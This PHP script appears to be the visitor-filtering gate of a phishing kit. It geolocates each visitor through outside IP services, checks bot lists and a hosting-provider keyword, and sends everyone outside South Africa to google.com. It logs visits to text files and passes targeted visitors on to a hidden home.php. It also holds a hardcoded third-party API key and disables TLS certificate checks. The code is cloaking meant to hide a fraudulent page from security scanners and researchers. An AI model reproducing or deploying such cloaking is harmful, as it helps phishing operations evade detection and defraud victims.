<?php
error_reporting(0);
date_default_timezone_set('Europe/Madrid');
$Sam1 =date("D,M,d,Y-g:ia");
//-------------------------- COUNTRIES
$allowed = array('ZA');
//--------------------------
$ip = $_SERVER['REMOTE_ADDR'];

//--------------------------------------
function ANTI_ANTISPAM($ip){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://ip.nf/$ip.json");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	$resp = curl_exec($ch);
	curl_close($ch);
	$ipDetails = json_decode($resp,true);
	$c_code = $ipDetails["ip"]["country_code"];
	$_SESSION["ip"] = $ip;
	$_SESSION["hostname"] = $ipDetails["ip"]["hostname"];
	$_SESSION["country"] = $ipDetails["ip"]["country"];
	$_SESSION["asn"] = $ipDetails["ip"]["asn"];
	$_SESSION["dtetme"] = date('d/m/Y H:i:s', time());
	$blocked_words = array("acens");
	
	foreach($blocked_words as $word) {
		if (strrpos(strtoupper($resp), strtoupper($word)) ) {
			return true;
		}
	}

	return false;
}

//---------- CHECK IP BOTS -------------
function IS_BOT($ip)
{
	$url="http://bot.myip.ms/$ip";
	$agent="Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_USERAGENT, $agent);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_URL, $url);
	$res = curl_exec($ch);
	curl_close($ch);
if (strpos($res, 'Web Bot exists on this IP address and Listed in Myip.ms Web Bot list') == true) 
{return true;}
else{return false;}
}

//-----------------------------------
function IP_TO_EARTH($ip){$_URL="https://iptoearth.expeditedaddons.com/?api_key=ECKW4U278N4YQLMZTG703P91BS9R52H068IOXJ5D6FA3V1&ip=$ip"; 
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_URL, $_URL);$content = curl_exec($ch);
$response=json_decode($content, true);
return $response;curl_close($ch);}
//-----------------------------------------------------------------
$response=IP_TO_EARTH($ip);
$response['country_code'];
$response['country'];
$country = $response['country'];
$countrycode = $response['country_code'];
//-----------------------------------------------
if(!in_array($countrycode, $allowed)){
$data = 'Blocked visit from : '.$country.' | Ip : '.$_SERVER['REMOTE_ADDR'].' | Visit on : '.$Sam1;
file_put_contents('./NO.txt', $data.PHP_EOL, FILE_APPEND);
header('Location: https://www.google.com');
exit();
}else {
$data = 'Visit from : '.$country.' | Ip : '.$_SERVER['REMOTE_ADDR'].' | Visit on : '.$Sam1;
file_put_contents('./YES.txt', $data.PHP_EOL, FILE_APPEND);
header('Location: ./home.php?'.hash('crc32b',$ip));
}
?>
